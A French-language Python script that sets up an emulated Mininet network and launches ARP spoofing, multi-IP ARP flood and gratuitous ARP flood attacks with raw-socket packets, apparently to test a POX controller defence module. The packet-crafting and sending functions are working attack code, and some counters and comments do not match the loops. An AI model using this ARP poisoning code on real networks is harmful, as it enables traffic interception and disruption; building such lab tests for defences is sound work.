#!/usr/bin/env python3
"""
Simulateur d'attaques ARP Spoofing pour Mininet
Compatible avec le module arp_defense.py POX
"""

from mininet.net import Mininet
from mininet.node import Controller, OVSSwitch, RemoteController
from mininet.link import TCLink
from mininet.cli import CLI
from mininet.log import setLogLevel
import time

def customTopology():
    net = Mininet(controller=RemoteController, link=TCLink, switch=OVSSwitch)
    
    net.addController('c0', ip='172.18.0.2', port=6633)
    
    h1 = net.addHost('h1', ip='10.0.1.10/24')
    h2 = net.addHost('h2', ip='10.0.1.11/24')
    h3 = net.addHost('h3', ip='10.0.1.12/24')
    s1 = net.addSwitch('s1')
    
    h4 = net.addHost('h4', ip='10.0.2.10/24')
    h5 = net.addHost('h5', ip='10.0.2.11/24')
    h6 = net.addHost('h6', ip='10.0.2.20/24')
    s2 = net.addSwitch('s2')
    
    router = net.addHost('r0', ip='10.0.1.1/24')
    
    net.addLink(h1, s1)
    net.addLink(h2, s1)
    net.addLink(h3, s1)
    net.addLink(h4, s2)
    net.addLink(h5, s2)
    net.addLink(h6, s2)
    net.addLink(router, s1)
    net.addLink(router, s2)
    
    net.start()
    
    router.cmd('ifconfig r0-eth1 10.0.2.1/24')
    router.cmd('sysctl -w net.ipv4.ip_forward=1')
    
    for h in [h1, h2, h3]:
        h.cmd('ip route add default via 10.0.1.1')
    for h in [h4, h5, h6]:
        h.cmd('ip route add default via 10.0.2.1')
    
    print('\n=== Configuration initiale ===')
    print('Lancement du serveur web sur H1 (10.0.1.10)')
    h1.cmd('python3 -m http.server 80 &')
    time.sleep(2)
    
    print('Trafic légitime activé (H2, H3, H4, H5)')
    h2.cmd('while true; do curl -s http://10.0.1.10 > /dev/null; sleep 3; done &')
    h3.cmd('while true; do curl -s http://10.0.1.10 > /dev/null; sleep 3; done &')

    # Pré-remplir les tables ARP pour réclamer les MACs
    net.pingAll()
    
    print('\n' + '='*60)
    print('MENU DES ATTAQUES ARP DISPONIBLES')
    print('='*60)
    
    while True:
        print('\n[1] ARP Spoofing - Usurpation du serveur H1 (IP Hijacking)')
        print('[2] ARP Flood - 1 MAC prétend avoir plusieurs IPs')
        print('[3] Gratuitous ARP Flood - Spam de requêtes ARP')
        print('[8] Lancer CLI Mininet (debug)')
        print('[0] Quitter')
        
        choice = input('\nChoisir une attaque (1-3, 8, 0) : ').strip()
        
        if choice == '1':
            arp_spoofing_attack(net, h6, '10.0.2.10', h4)
        elif choice == '2':
            arp_flood_attack(net, h6)
        elif choice == '3':
            gratuitous_arp_flood(net, h6, '10.0.2.10')
        elif choice == '8':
            print('\n=== CLI Mininet (tapez "exit" pour revenir au menu) ===')
            CLI(net)
        elif choice == '0':
            break
        else:
            print('Choix invalide!')
    
    print('\nArrêt du réseau...')
    net.stop()


def craft_arp_packet(src_mac, src_ip, dst_mac, dst_ip, operation='reply'):
    """
    Crée un paquet ARP en bytes
    operation: 'request' (1) ou 'reply' (2)
    """
    import socket
    
    # Convertir MAC en bytes
    def mac_to_bytes(mac):
        return bytes.fromhex(mac.replace(':', ''))
    
    # Convertir IP en bytes
    def ip_to_bytes(ip):
        return socket.inet_aton(ip)
    
    # Frame Ethernet
    eth_dst = mac_to_bytes(dst_mac)
    eth_src = mac_to_bytes(src_mac)
    eth_type = b'\x08\x06'  # ARP = 0x0806
    
    # Paquet ARP
    hw_type = b'\x00\x01'       # Ethernet
    proto_type = b'\x08\x00'    # IPv4
    hw_size = b'\x06'           # Taille MAC
    proto_size = b'\x04'        # Taille IP
    
    # Operation: 1=request, 2=reply
    op_code = b'\x00\x02' if operation == 'reply' else b'\x00\x01'
    
    sender_mac = mac_to_bytes(src_mac)
    sender_ip = ip_to_bytes(src_ip)
    target_mac = mac_to_bytes(dst_mac)
    target_ip = ip_to_bytes(dst_ip)
    
    # Assembler le paquet ARP
    arp_packet = (hw_type + proto_type + hw_size + proto_size + 
                  op_code + sender_mac + sender_ip + target_mac + target_ip)
    
    # Paquet complet
    full_packet = eth_dst + eth_src + eth_type + arp_packet
    
    return full_packet

def send_raw_packet(host, interface, packet_bytes):
    """
    Envoie un paquet raw depuis un host Mininet
    """
    import base64
    
    # Encoder le paquet en base64 pour le passer en paramètre
    packet_b64 = base64.b64encode(packet_bytes).decode()
    
    # Script Python inline pour envoyer le paquet
    send_script = f'''
import socket
import base64

packet = base64.b64decode("{packet_b64}")
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind(("{interface}", 0))
s.send(packet)
s.close()
print("Paquet envoyé !")
'''
    
    # Exécuter sur le host
    result = host.cmd(f"python3 -c '{send_script}'")
    return result

def arp_spoofing_attack(net, attacker, target_ip, target_host):
    """
    Fonction d'attaque ARP Spoofing compatible avec ton code
    Sans Scapy - utilise raw sockets
    """
    print('\n' + '='*60)
    print('ATTAQUE 1 : ARP SPOOFING (IP Hijacking)')
    print('='*60)
    print(f'Attaquant : {attacker.name} ({attacker.IP()})')
    print(f'Cible : {target_ip}')
    
    real_mac = target_host.MAC()
    attacker_mac = attacker.MAC()
    attacker_iface = attacker.defaultIntf().name
    
    print(f'MAC légitime de {target_ip} : {real_mac}')
    print(f'MAC de l\'attaquant : {attacker_mac}')
    print(f'\n→ L\'attaquant envoie des ARP Reply prétendant que {target_ip} a la MAC {attacker_mac}')
    
    # Créer le paquet ARP malveillant en broadcast
    # Ethernet dst=broadcast, ARP: "Je suis target_ip et ma MAC est attacker_mac"
    poisoned_packet = craft_arp_packet(
        src_mac=attacker_mac,
        src_ip=target_ip,
        dst_mac="ff:ff:ff:ff:ff:ff",  # Broadcast
        dst_ip=target_ip,
        operation='reply'
    )
    
    print("Envoi de 10 paquets ARP falsifiés via raw socket...")
    
    # Envoyer les paquets depuis l'attaquant
    for i in range(10):
        send_raw_packet(attacker, attacker_iface, poisoned_packet)
        time.sleep(0.1)
        if (i + 1) % 10 == 0:
            print(f"  → {i + 1}/50 paquets envoyés...")
    
    print('✓ Attaque terminée')
    print('\n⚠️  RÉSULTAT ATTENDU : Le firewall POX devrait détecter :')
    print(f'   - "[ALERTE ARP SPOOFING] IP {target_ip} change de MAC"')
    print(f'   - Blocage de la MAC {attacker_mac}')


def arp_flood_attack(net, attacker):
    print('\n' + '='*60)
    print('ATTAQUE 2 : ARP FLOOD (Multiple IPs per MAC)')
    print('='*60)
    print(f'Attaquant : {attacker.name} ({attacker.IP()})')
    print('→ Une seule MAC prétend avoir 10 IPs différentes')
    
    attacker_mac = attacker.MAC()
    attacker_iface = attacker.defaultIntf().name
    
    fake_ips = [
        '10.0.2.50', '10.0.2.51'
    ]
    
    print(f'IPs usurpées : {fake_ips}')
    
    for fake_ip in fake_ips:
        # Créer un Gratuitous ARP (annonce que fake_ip a la MAC de l'attaquant)
        # En broadcast pour que tout le monde l'entende
        gratuitous_packet = craft_arp_packet(
            src_mac=attacker_mac,
            src_ip=fake_ip,
            dst_mac="ff:ff:ff:ff:ff:ff",
            dst_ip=fake_ip,
            operation='reply'  # Gratuitous ARP = ARP reply non sollicité
        )
        
        for _ in range(1):
            send_raw_packet(attacker, attacker_iface, gratuitous_packet)
        
        print(f'  → Envoi ARP pour {fake_ip}')
        time.sleep(0.2)
    
    print('✓ Attaque terminée')
    print('\n⚠️  RÉSULTAT ATTENDU : Le firewall POX devrait détecter :')
    print(f'   - "[ALERTE ARP FLOOD] MAC prétend avoir 10 IPs"')
    print(f'   - Blocage de la MAC de {attacker.name}')


def gratuitous_arp_flood(net, attacker, target_ip):
    print('\n' + '='*60)
    print('ATTAQUE 3 : GRATUITOUS ARP FLOOD')
    print('='*60)
    print(f'Attaquant : {attacker.name}')
    print(f'→ Envoi de 50 ARP REQUEST vers {target_ip}')
    
    attacker_mac = attacker.MAC()
    attacker_ip = attacker.IP()
    attacker_iface = attacker.defaultIntf().name
    
    # Créer un paquet ARP Request
    arp_request = craft_arp_packet(
        src_mac=attacker_mac,
        src_ip=attacker_ip,
        dst_mac="ff:ff:ff:ff:ff:ff",  # Broadcast
        dst_ip=target_ip,
        operation='request'  # ARP Request
    )
    
    print('Envoi de 50 paquets ARP REQUEST...')
    
    for i in range(50):
        send_raw_packet(attacker, attacker_iface, arp_request)
        time.sleep(0.01)  # 100 paquets/seconde
        if (i + 1) % 20 == 0:
            print(f'  → {i + 1}/50 paquets envoyés...')
    
    print('✓ Attaque terminée')
    print('\n⚠️  RÉSULTAT ATTENDU : Le firewall POX devrait détecter :')
    print('   - "[ALERTE GRATUITOUS ARP] trop d\'ARP REQUEST"')
    print(f'   - Blocage de la MAC de {attacker.name}')


if __name__ == '__main__':
    setLogLevel('info')
    print('''
╔═══════════════════════════════════════════════════════════╗
║   SIMULATEUR D'ATTAQUES ARP SPOOFING - MININET + POX     ║
║   Compatible avec arp_defense.py                          ║
╚═══════════════════════════════════════════════════════════╝

PRÉREQUIS :
1. Lancer POX avec : ./pox.py arp_defense
2. Le contrôleur doit être accessible sur 172.18.0.2:6633
''')
    
    input('Appuyez sur Entrée pour démarrer la topologie...')
    customTopology()
